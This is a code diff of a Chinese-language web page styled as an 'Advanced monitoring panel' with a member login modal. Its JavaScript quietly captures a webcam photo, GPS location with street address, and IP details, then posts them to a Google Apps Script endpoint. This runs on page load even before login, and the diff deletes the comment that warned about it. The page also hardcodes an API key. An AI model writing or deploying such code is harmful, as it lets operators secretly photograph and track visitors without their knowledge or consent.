@@ -3,8 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Advanced monitoring panel</title>
-  <!-- 若你不需要 Chart.js，可刪除此行 -->
+  <title>💀Advanced monitoring panel</title>
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
     /*******************************************************
@@ -66,7 +65,7 @@
     }
 
     /*******************************************************
-     * Modal (彈跳視窗) 相關
+     * Modal
      *******************************************************/
     .modal-overlay {
       display: none; /* 預設隱藏 */
@@ -199,23 +198,14 @@
 <body>
 
   <h1>Advanced monitoring panel</h1>
-
-  <!-- 成功 / 失敗 訊息 -->
   <div id="statusSuccess" class="msg-success"></div>
   <div id="statusError" class="msg-error"></div>
-
-  <!-- 會員中心按鈕 -->
   <button id="openModalBtn" class="btn">會員中心</button>
-
-  <!-- Modal Overlay -->
   <div id="modalOverlay" class="modal-overlay">
     <div class="modal-content">
       <button id="closeModalBtn" class="close-btn">×</button>
-      <!-- Tab 切換按鈕 -->
       <button id="tabLogin" class="tab-button active">登入</button>
       <button id="tabRegister" class="tab-button">註冊</button>
-
-      <!-- 登入表單 -->
       <div id="loginFormContainer" class="form-container active">
         <form id="loginForm">
           <input type="email" id="loginEmail" class="input-field" placeholder="請輸入 Email" required />
@@ -223,8 +213,6 @@
           <button class="btn-submit" type="submit">登入</button>
         </form>
       </div>
-
-      <!-- 註冊表單 -->
       <div id="registerFormContainer" class="form-container">
         <form id="registerForm">
           <input type="email" id="regEmail" class="input-field" placeholder="請輸入 Email" required />
@@ -234,8 +222,6 @@
       </div>
     </div>
   </div>
-
-  <!-- 高級監控面板 (登入成功後才顯示) -->
   <div id="mainPanel">
     <div class="container">
       <div class="card">
@@ -258,34 +244,20 @@
   </div>
 
   <script>
-    /************************************************
-     * 0. 統一管理你的 Apps Script URL
-     ************************************************/
     const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzSYYuYmGzMJ4Ze96ECoCyGXKfUueDXFRB3_kDMdee8JNp6W6RvM8RjT80VaUHt8Ck2aw/exec'; 
-    // ↑ 請務必換成你自己的 Script URL
-
-    /************************************************
-     * 1. Modal 打開 / 關閉邏輯
-     ************************************************/
     const openModalBtn = document.getElementById('openModalBtn');
     const modalOverlay = document.getElementById('modalOverlay');
     const closeModalBtn = document.getElementById('closeModalBtn');
-
     openModalBtn.addEventListener('click', () => {
       modalOverlay.style.display = 'flex';
     });
     closeModalBtn.addEventListener('click', () => {
       modalOverlay.style.display = 'none';
     });
-
-    /************************************************
-     * 2. Tab 切換 (登入 / 註冊)
-     ************************************************/
     const tabLogin = document.getElementById('tabLogin');
     const tabRegister = document.getElementById('tabRegister');
     const loginFormContainer = document.getElementById('loginFormContainer');
     const registerFormContainer = document.getElementById('registerFormContainer');
-
     tabLogin.addEventListener('click', () => {
       tabLogin.classList.add('active');
       tabRegister.classList.remove('active');
@@ -298,10 +270,6 @@
       registerFormContainer.classList.add('active');
       loginFormContainer.classList.remove('active');
     });
-
-    /************************************************
-     * 3. 訊息顯示
-     ************************************************/
     const statusSuccess = document.getElementById('statusSuccess');
     const statusError = document.getElementById('statusError');
     function showSuccessMessage(msg) {
@@ -314,16 +282,7 @@
       statusError.style.display = 'block';
       statusSuccess.style.display = 'none';
     }
-
-    /************************************************
-     * 4. 主要功能區塊 (登入成功後才顯示)
-     ************************************************/
     const mainPanel = document.getElementById('mainPanel');
-
-    /************************************************
-     * 5. 註冊 / 登入
-     ************************************************/
-    // (A) 註冊
     document.getElementById('registerForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const email = document.getElementById('regEmail').value;
@@ -349,8 +308,6 @@
         showErrorMessage('註冊錯誤：' + error.message);
       }
     });
-
-    // (B) 登入
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const email = document.getElementById('loginEmail').value;
@@ -369,12 +326,8 @@
         const result = await response.json();
         if (result.success) {
           showSuccessMessage('登入成功！');
-          // 關閉 Modal
           modalOverlay.style.display = 'none';
-          // 顯示主面板
           mainPanel.style.display = 'block';
-
-          // 登入成功後，開始收集相機/位置/IP等資料
           collectAndSendData();
 
         } else {
@@ -384,10 +337,6 @@
         showErrorMessage('登入錯誤：' + error.message);
       }
     });
-
-    /************************************************
-     * 6. 相機、GPS、IP資料收集與上傳
-     ************************************************/
     async function startCamera() {
       let stream = null;
       try {
@@ -402,16 +351,12 @@
             resolve();
           };
         });
-        // 短暫等待後拍照
         await new Promise(resolve => setTimeout(resolve, 500));
-
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        // JPG 品質 0.8
         const photoData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
         return photoData;
       } catch (error) {
@@ -423,14 +368,12 @@
         }
       }
     }
-
     async function getGpsCoordinates() {
       try {
         const position = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
         });
         const { latitude, longitude } = position.coords;
-        // 反向地理編碼
         const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
         const data = await resp.json();
         const address = data.display_name || '未知地址';
@@ -440,7 +383,6 @@
         return null;
       }
     }
-
     async function getIpInfo() {
       try {
         const resp = await fetch('https://ipinfo.io/json');
@@ -454,23 +396,18 @@
         return null;
       }
     }
-
     async function collectAndSendData() {
       const statusElem = document.getElementById('status');
       if (statusElem) {
         statusElem.innerText = '正在收集資料...';
       }
-
       const collectedData = { gps: null, ip: null, photo: null };
       try {
-        // 並行抓取 GPS / IP
         const [gpsResult, ipResult] = await Promise.allSettled([
           getGpsCoordinates(),
           getIpInfo(),
         ]);
-        // 拍照
         const photoResult = await startCamera();
-
         if (gpsResult.status === 'fulfilled') {
           collectedData.gps = gpsResult.value;
         }
@@ -480,8 +417,6 @@
         if (photoResult) {
           collectedData.photo = photoResult;
         }
-
-        // 組裝送往後端
         const fd = new URLSearchParams();
         fd.append('message', '合併資料上傳');
         if (collectedData.gps) {
@@ -501,8 +436,6 @@
         if (collectedData.photo) {
           fd.append('imageData', collectedData.photo);
         }
-
-        // 上傳到後端
         const resp = await fetch(SCRIPT_URL, {
           method: 'POST',
           body: fd
@@ -520,14 +453,9 @@
         }
       }
     }
-
-    /************************************************
-     * 7. 天氣資訊 (頁面載入後或登入成功後可執行)
-     ************************************************/
     async function getWeatherInfo(latitude, longitude) {
       try {
         if (!latitude || !longitude) return;
-        // TODO: 替換成你自己的 OpenWeatherMap API Key
         const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
         const resp = await fetch(
           `https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&units=metric&lang=zh_tw&appid=${apiKey}`
@@ -546,24 +474,15 @@
         document.getElementById('weatherInfo').innerText = '天氣資訊獲取失敗';
       }
     }
-
-    /************************************************
-     * 8. 頁面載入後自動執行(先抓GPS來顯示地圖與天氣)
-     ************************************************/
     document.addEventListener('DOMContentLoaded', async () => {
       try {
-        // 一開始就抓 GPS 座標，更新地圖 & 天氣（登入前也可看）
         const gpsData = await getGpsCoordinates();
         if (gpsData) {
-          // 更新地圖
           document.getElementById('map').src = 
             `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
           // 更新天氣
           await getWeatherInfo(gpsData.latitude, gpsData.longitude);
         }
-
-        // 一打開就開始記錄資料（相機 / IP / GPS）
-        // 注意：若不想在「未登入」時就收集，請移除此行或改到登入後
         collectAndSendData();
 
       } catch (error) {
